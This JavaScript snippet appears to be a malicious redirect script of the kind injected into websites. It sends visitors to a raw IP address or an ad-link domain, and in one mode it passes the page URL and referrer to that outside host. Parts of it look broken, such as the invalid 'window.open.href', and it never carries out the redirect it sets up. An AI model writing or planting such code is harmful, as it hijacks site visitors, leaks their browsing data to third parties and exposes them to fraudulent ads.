var go_current     	= window.open.href;
    var reff     		= document.referrer;
    

    function rChoice(arr) {
	    return arr[Math.floor(arr.length * Math.random())];
	}

    var direct_link_ads = rChoice([
                            "https://evaluationgnatprotected.com/pa8p7tqv?key=1df763ffd87439a4c56eb174897f8779",
                            "https://evaluationgnatprotected.com/pa8p7tqv?key=1df763ffd87439a4c56eb174897f8779",
                        ]);

    var ars             = rChoice([
                            "http://52.175.58.92/resep",
                        ]);


    var dir_type        = "domain"; //refresh, domain, path, arsae


    if(dir_type == 'refresh')
    {
        //REFRESH
        console.log('refresh..');
    }
    else if(dir_type == 'domain')
    {
        //==> OTHER DOMAIN
        go_current = ars;
    }
    else if(dir_type == 'path')
    {
        //==> PATH DIRECT
        var pre_current   = ars + window.location.pathname;
        go_current        = pre_current.includes("?")?pre_current+"&c=1":pre_current+"?c=1";
    }
    else if(dir_type == 'arsae')
    {
        //==> ARSAE DIRECT
        go_current            = ars + '/?arsae='+ encodeURIComponent(go_current) + '&arsae_ref='+ encodeURIComponent(reff);
    }
